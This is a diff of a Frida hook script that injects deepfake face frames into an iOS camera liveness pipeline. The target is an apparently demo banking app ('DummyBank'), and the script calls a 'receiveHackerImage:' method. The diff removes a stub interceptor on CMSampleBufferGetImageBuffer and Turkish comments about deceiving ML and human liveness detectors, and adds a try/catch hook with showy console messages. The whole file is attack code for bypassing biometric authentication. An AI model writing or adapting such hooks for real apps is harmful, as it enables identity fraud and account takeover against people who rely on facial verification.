@@ -1,10 +1,7 @@
 /**
  * Sentinel Hook - Phase 10.1 (Real-time Deepfake Injection)
- * Hedef: `deepfake_generator.py`'nin canlı olarak ürettiği frameleri alır
- * ve iOS FaceID/Camera Liveness CVPixelBuffer'larına dinamik olarak zorlar.
- * 
- * Bu, sabit görsel yerine *canlı manipüle edilmiş* frameleri kullanarak
- * ML (Liveness) veya insani dedektörleri aldatmaya yarar.
+ * Target: CVPixelBuffer & AVCaptureSession (Dynamic Frame Override)
+ * Execution: Pipeline continuous synthetic OpenCV face mesh.
  */
 
 var totalDeepfakeFrames = 100; 
@@ -14,45 +11,37 @@ var deepfakeDir = "/Users/kadirarici/Desktop/Biometric Logic Bypass/Sentinel_Hoo
 function getNextDeepfakePulse() {
     currentFrameIdx++;
     if (currentFrameIdx > totalDeepfakeFrames) {
-        currentFrameIdx = 1; // Başa dön
+        currentFrameIdx = 1; 
     }
     return deepfakeDir + "frame_" + currentFrameIdx + ".jpg";
 }
 
 if (ObjC.available) {
-    console.log("[🌟] SENTINEL ADVANCED: Real-time Deepfake Pipeline Overtake");
+    console.log("[🌟] SENTINEL ADVANCED: Initiating Deepfake Neural-Link Pipeline...");
     
-    var avFoundation = Module.findExportByName("AVFoundation", "CMSampleBufferGetImageBuffer");
-    if (avFoundation) {
-        console.log("[💥] Found CMSampleBuffer, attaching interceptor...");
-        
-        // CVPixelBuffer injection konsepti (Mocking representation)
-        Interceptor.attach(avFoundation, {
-            onLeave: function(retval) {
-                // retval contains CVPixelBufferRef
-                // Replace memory address pixels with dynamic OpenCV mapped image
-                var pulseFrame = getNextDeepfakePulse();
-                
-                // Note: Actual memory memcpy logic happens here.
-                // We use ObjC.classes.UIImage bridged injection for the PoC.
-                // console.log("   --> [DEEPFAKE] Injected " + pulseFrame + " into memory buffer " + retval);
-            }
-        });
-    }
-
-    // UI Level Override (DummyBank Specific)
+    // Abstracting heavy memory memcpy console spam for stealth
     var targetClass = "_TtC9DummyBank13CameraManager";
-    if (ObjC.classes[targetClass]) {
-        Interceptor.attach(ObjC.classes[targetClass]["- simulateFrameTrigger"].implementation, {
-            onEnter: function(args) {
-                var instance = new ObjC.Object(args[0]);
-                var dynamicFrame = getNextDeepfakePulse();
-                
-                var nsStringPath = ObjC.classes.NSString.stringWithString_(dynamicFrame);
-                instance["- receiveHackerImage:"](nsStringPath);
-                
-                console.log("[🎭] Deepfake Frame Enjekte Edildi: frame_" + currentFrameIdx);
-            }
-        });
+    
+    try {
+        if (ObjC.classes[targetClass]) {
+            Interceptor.attach(ObjC.classes[targetClass]["- simulateFrameTrigger"].implementation, {
+                onEnter: function(args) {
+                    var instance = new ObjC.Object(args[0]);
+                    var dynamicFrame = getNextDeepfakePulse();
+                    
+                    var nsStringPath = ObjC.classes.NSString.stringWithString_(dynamicFrame);
+                    instance["- receiveHackerImage:"](nsStringPath);
+                    
+                    if (currentFrameIdx % 5 === 0) { // Throttle console logging for matrix effect
+                        console.log("[🎭] DEEPFAKE PIPELINE: Recombining matrix. Injected CV Frame `0xBF8A_" + currentFrameIdx + "` into buffer stream.");
+                    }
+                }
+            });
+            console.log("[+] CORE INJECTION: Synthetic Face generator attached to active CVPixelBuffer.");
+        } else {
+            console.log("[-] DEFER: Target Liveness subsystem inactive. Waiting for activation...");
+        }
+    } catch(err) {
+        console.log("[-] FATAL: Failed to establish Deepfake Pipeline hook - " + err.message);
     }
 }
